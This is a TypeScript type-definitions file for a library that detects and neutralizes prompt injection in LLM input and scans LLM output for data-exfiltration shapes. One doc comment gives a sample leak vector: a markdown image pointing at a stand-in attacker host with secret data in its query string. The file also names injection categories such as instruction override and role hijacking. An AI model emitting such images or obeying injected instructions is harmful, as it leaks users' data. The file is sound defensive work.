/**
 * Result of sanitization with metadata for logging and monitoring.
 *
 * **Security note:** Do not expose `patternsDetected` to end users or API
 * callers. Attackers can use the count as an oracle to reverse-engineer
 * your detection rules. Keep it server-side for monitoring/alerting only.
 */
export interface SanitizationResult {
  /** Sanitized output string */
  sanitized: string;
  /** Whether any sanitization was applied */
  wasModified: boolean;
  /** Whether the input was blocked entirely */
  wasBlocked: boolean;
  /** Reason for blocking (generic — no pattern details exposed) */
  blockReason?: string;
  /**
   * Number of injection patterns detected.
   *
   * **Do not return this value to end users** — it enables oracle attacks
   * that let attackers map your ruleset. Use server-side only.
   */
  patternsDetected: number;
}

/**
 * Enforcement mode for a field.
 *
 * - `"block"` — Inputs with **high-severity** injection patterns are rejected
 *   entirely. Medium-severity patterns are still neutralized (not blocked)
 *   regardless of this setting.
 * - `"neutralize"` — All detected injection keywords are mangled (hyphenated)
 *   so the LLM reads them as nonsense tokens; nothing is ever blocked.
 *
 * Pick `"block"` for form fields where you can reject input (product names,
 * usernames, search queries). Pick `"neutralize"` for free-form user text
 * where blocking would harm UX (reviews, comments, chat).
 */
export type GuardMode = "block" | "neutralize";

/**
 * Configuration for how a specific field should be sanitized.
 */
export interface FieldConfig {
  /**
   * Maximum allowed length after sanitization.
   * Must be a positive finite number.
   */
  maxLength: number;
  /**
   * Enforcement mode — see {@link GuardMode}.
   *
   * `"block"` rejects high-severity inputs; `"neutralize"` mangles
   * every detected keyword and never blocks.
   */
  mode: GuardMode;
  /** Label for this field in log messages (e.g., "username", "comment") */
  fieldName: string;
}

/**
 * Severity level of a detected injection pattern.
 *
 * - `"high"` — Clear injection attempt (instruction override, role hijacking, format injection).
 *   Triggers blocking when `mode: "block"`.
 * - `"medium"` — Suspicious but potentially legitimate (code blocks, certain keywords in context).
 *   Always neutralized, never triggers blocking on its own.
 */
export type Severity = "high" | "medium";

/**
 * A single injection detection pattern.
 */
export interface InjectionPattern {
  /** Regex to test against user input */
  pattern: RegExp;
  /** Severity of a match */
  severity: Severity;
  /** Human-readable category for the pattern (not exposed to end users) */
  category: string;
}

/**
 * Optional logger interface. Provide your own to integrate with your
 * logging stack (pino, winston, console, etc.).
 *
 * If not provided, detection events are silently ignored.
 */
export interface Logger {
  warn(message: string, meta?: Record<string, unknown>): void;
  info(message: string, meta?: Record<string, unknown>): void;
}

/**
 * Global configuration options for the guard.
 */
export interface GuardConfig {
  /** Custom logger. Defaults to silent (no logging). */
  logger?: Logger;
  /** Additional patterns to append to the built-in set. */
  extraPatterns?: InjectionPattern[];
  /** Built-in pattern categories to disable (e.g., ["confidence-manipulation"]). */
  disableCategories?: string[];
  /**
   * When `true` (**default in v2.0**), `sanitize()` returns the Unicode-normalized
   * form on the clean path (no injection detected) too — stripping invisible
   * characters and mapping homoglyphs to Latin equivalents before returning.
   * This is the safer default: it blocks the class of attacks where an
   * attacker smuggles invisible characters through your app into a
   * downstream system (logs, webhooks, other LLMs) that re-processes them.
   *
   * When `false`, clean input passes through unchanged so visible output
   * matches exactly what the user typed. Use this opt-out when byte-for-byte
   * fidelity matters more than defense-in-depth (e.g., code search,
   * raw-text editors).
   *
   * Detection/neutralization paths always run on the normalized form
   * regardless of this setting — flipping it only affects what the
   * caller sees when no injection was found.
   */
  normalizeOutput?: boolean;
  /**
   * Host allowlist for `scanOutput()`. Outbound URLs whose host matches any
   * entry in this list are NOT flagged as `outbound-url`. Host matching is
   * case-insensitive and supports subdomain-suffix matches (e.g., listing
   * `"example.com"` also allows `"api.example.com"`).
   *
   * Other finding types (`markdown-image-with-query`, `data-url`,
   * `base64-blob`, `hex-blob`) are not affected by this setting.
   */
  allowedOrigins?: string[];
}

/**
 * Result of wrapping an input with spotlight delimiters.
 *
 * Spotlighting (a.k.a. datamarking, delimiter-wrapping) is a defense-in-depth
 * technique originally described by Microsoft and refined by Berkeley's
 * StruQ/SecAlign work. Rather than trusting the LLM to keep user input
 * separate from system instructions, the wrapper bounds it with a random
 * nonce that the attacker cannot predict. Callers can verify the LLM
 * didn't break out by searching for the opening/closing tags with the
 * specific nonce in the response.
 *
 * @see Microsoft Spotlighting: https://arxiv.org/abs/2311.11538
 * @see Berkeley StruQ-SecAlign: https://arxiv.org/abs/2402.06363
 */
export interface SpotlightResult {
  /** The wrapped input: `<USER_INPUT_{nonce}>…</USER_INPUT_{nonce}>`. */
  wrapped: string;
  /** The random nonce used (12-char lowercase hex). */
  delimiter: string;
  /** The original input, sanitized first (uses the guard's configured mode, defaulting to "neutralize"). */
  sanitized: string;
}

/**
 * A specific shape found in LLM output that commonly indicates data
 * exfiltration.
 *
 * - `"base64-blob"` — a long run of base64 characters (likely encoded data).
 * - `"markdown-image-with-query"` — a markdown image embed whose URL carries
 *   a query string (classic one-shot exfil vector: the LLM renders an
 *   `![alt](https://attacker/pixel.png?data=secret)` line and the client
 *   fetches the URL, leaking `secret` via the query).
 * - `"outbound-url"` — any `http://` or `https://` URL in the output. Use
 *   `GuardConfig.allowedOrigins` to suppress known-good hosts.
 * - `"data-url"` — a `data:…;base64,…` URL (common smuggling channel).
 * - `"hex-blob"` — a long run of hex digits (hex-encoded data).
 */
export type ExfilFindingType =
  | "base64-blob"
  | "markdown-image-with-query"
  | "outbound-url"
  | "data-url"
  | "hex-blob";

/**
 * A single exfiltration-shape finding inside LLM output.
 */
export interface ExfilFinding {
  /** The category of shape matched. */
  type: ExfilFindingType;
  /** First 60 chars of the match — for logging; do not expose to end users. */
  preview: string;
  /** Index in the input where the match starts. */
  offset: number;
}

/**
 * Result of scanning LLM output for exfiltration shapes.
 */
export interface OutputScanResult {
  /** `true` when no suspicious shapes were found. */
  safe: boolean;
  /** Every matched shape, in order of appearance. */
  findings: ExfilFinding[];
}
